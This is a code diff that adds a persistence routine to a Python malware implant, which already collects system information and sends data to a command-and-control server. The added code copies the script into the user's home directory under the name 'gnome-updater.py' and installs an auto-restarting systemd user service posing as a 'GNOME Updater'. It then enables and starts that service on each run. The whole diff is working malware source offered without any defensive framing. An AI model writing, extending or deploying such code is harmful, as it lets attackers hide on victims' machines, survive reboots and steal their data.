@@ -1,9 +1,58 @@
 import http.client, socket, requests
-import os, subprocess
+import os, subprocess, shutil
 import json, time
 
 HOST = "localhost"
 PORT = 4443
+
+def persistence():
+    try:
+        user_home = os.path.expanduser("~")
+        dir = os.path.join(user_home, ".local", "share")
+        filename = "gnome-updater.py"
+        path = os.path.join(user_home, dir, filename)
+
+        current_path = os.path.abspath(__file__)
+
+        if current_path == path:
+            return
+
+        if not os.path.exists(dir):
+            os.makedirs(dir, exist_ok=True)
+
+        shutil.copyfile(current_path, path)
+        os.chmod(path, 0o755)
+
+        systemd_user_dir = os.path.join(user_home, ".config", "systemd", "user")
+
+        if not os.path.exists(systemd_user_dir):
+            os.makedirs(systemd_user_dir, exist_ok=True)
+
+        service_name = "gnome-updater.service"
+        service_path = os.path.join(systemd_user_dir, service_name)
+        service_content = f"""[Unit]
+    Description=GNOME Updater
+
+    [Service]
+    ExecStart=/usr/bin/python3 {path}
+    Restart=always
+
+    [Install]
+    WantedBy=default.target
+    """
+
+        with open(service_path, 'w') as service_file:
+            service_file.write(service_content)
+
+        subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
+        subprocess.run(["systemctl", "--user", "enable", service_name], check=True)
+        subprocess.run(["systemctl", "--user", "start", service_name], check=True)
+
+        exit()
+
+    except Exception as e:
+        print(f"Persistence failed: {e}")
+        pass
 
 def send_data_to_c2(data, path):
     try:
@@ -141,6 +190,8 @@ def collect_system_info():
         return f"Failed to complete!"
 
 def main():
+
+    persistence()
 
     collect_system_info()
     login = subprocess.run("whoami", capture_output=True, text=True).stdout.strip()
